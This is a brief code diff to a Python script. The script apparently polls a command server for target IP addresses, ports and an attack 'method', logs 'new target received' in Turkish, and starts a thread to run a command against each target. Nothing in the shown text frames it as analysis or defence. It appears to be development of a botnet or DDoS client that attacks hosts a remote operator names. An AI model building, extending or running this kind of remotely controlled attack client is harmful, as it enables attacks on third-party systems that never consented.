@@ -63,8 +63,9 @@ def send_get_request():
                     if 'ip' in data and 'port' in data:
                         ip = data['ip']
                         port = data['port']
+                        method = data['method']
                         
-                        print(f"\n[*] Yeni hedef alındı - IP: {ip}, Port: {port}")
+                        print(f"\n[*] Yeni hedef alındı - IP: {ip}, Port: {port}, Method {method}")
                         
                         command_thread = Thread(target=execute_command, args=(ip, port, method))
                         command_thread.daemon = True
